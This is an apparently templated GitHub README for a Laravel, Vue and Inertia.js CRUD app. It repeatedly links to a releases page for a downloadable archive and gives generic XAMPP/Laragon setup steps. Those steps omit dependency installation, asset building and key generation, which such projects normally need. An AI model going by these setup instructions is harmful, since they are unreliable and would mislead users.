# 🎉 inertia-crud-laravel-vue - Easy SPA CRUD App Setup

## 📥 Download Now
[![Download inertia-crud-laravel-vue](https://img.shields.io/badge/Download-inertia--crud--laravel--vue-blue.svg)](https://github.com/Jesus1991ej/inertia-crud-laravel-vue/releases)

## 🚀 Getting Started
Welcome to the **inertia-crud-laravel-vue** project! This application uses Inertia.js to help you build a modern single-page application (SPA) style CRUD platform using Laravel and Vue.js. With simple steps, you can manage and create data without delving into complex APIs.

## 🌟 Key Features
- Simple user interface built with **Bootstrap**.
- Efficient data management with CRUD operations (Create, Read, Update, Delete).
- Uses **Laravel** as the backend framework for security and stability.
- Built with **Vue 3** for a smooth front-end experience.
- No complex setup—it’s designed for anyone to use!

## 📋 System Requirements
To run this application, you will need:
- A computer running Windows, macOS, or Linux.
- A modern web browser (Chrome, Firefox, Safari).
- Basic access to your terminal for installation steps.

## 📂 Installation Steps

### 1. Visit the Download Page
To get started, you must download the application. Please visit the following link to access it:

[Download the latest release](https://github.com/Jesus1991ej/inertia-crud-laravel-vue/releases)

### 2. Download the Files
On the Releases page, you will find the list of available versions. Choose the most recent version and click on the corresponding link to download the application files to your computer.

### 3. Extract the Files
Once the download is complete, locate the downloaded file in your downloads folder. This file is usually compressed (like a .zip file). Right-click on the file and select “Extract Here” or “Extract All.” Follow the prompts to extract the files.

### 4. Set Up Your Environment
You will need to set up an environment to run this application properly. For a seamless experience, we recommend using **XAMPP** or **Laragon** to run your local server.

#### a. Install XAMPP or Laragon
- Download and install [XAMPP](https://www.apachefriends.org/index.html) or [Laragon](https://laragon.org/).
- Follow the installation instructions provided on their official websites.

#### b. Move Application Files
After setting up your server, move the extracted application files into the appropriate folder:
- For **XAMPP**, it should be placed in the `htdocs` directory.
- For **Laragon**, it can go in the `www` directory.

### 5. Start Your Local Server
Open XAMPP or Laragon:
- For **XAMPP**, click on the “Start” button for both Apache and MySQL.
- For **Laragon**, it starts automatically when you run it.

### 6. Set Up the Database
You need to set up a database for the application:
#### a. Open phpMyAdmin
- Go to your web browser.
- Type `http://localhost/phpmyadmin` in the address bar.

#### b. Create a New Database
- Click on the “Databases” tab.
- Enter a name for your database (e.g., `crud_app`) and click “Create.”

#### c. Import Database Structure
Inside the application folder, locate the database SQL file (usually named `database.sql`). 
- In phpMyAdmin, select your created database, then click on the “Import” tab.
- Choose the SQL file and click “Go” to execute.

### 7. Configure Application Settings
Open the application folder and locate a file named `.env`. This file contains important settings.

#### a. Update Database Credentials
Edit the following lines to match your database settings:
```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=your_database_name
DB_USERNAME=root
DB_PASSWORD=
```
Replace `your_database_name` with the name of the database you created.

### 8. Run the Application
Now that everything is set up, launch your application:
- Go to your web browser.
- Type `http://localhost/your_application_folder` in the address bar. Replace `your_application_folder` with the actual name of the folder where you placed the app files.
- You should see the application running smoothly.

## 📚 Additional Help
If you encounter any issues during setup or usage, consult the **Issues** section of the repository or reach out for support.

## 🤝 Contributing
Although this guide is straightforward, contributions are welcome. If you are familiar with programming and wish to help improve the application, feel free to submit pull requests!

## 🌐 Explore More
Dive deeper into the features and learn how to utilize Inertia.js with Laravel and Vue for creating advanced applications. The ease of this setup allows you to focus more on building rather than configuring.

Don't forget to check the [Download page](https://github.com/Jesus1991ej/inertia-crud-laravel-vue/releases) for future updates!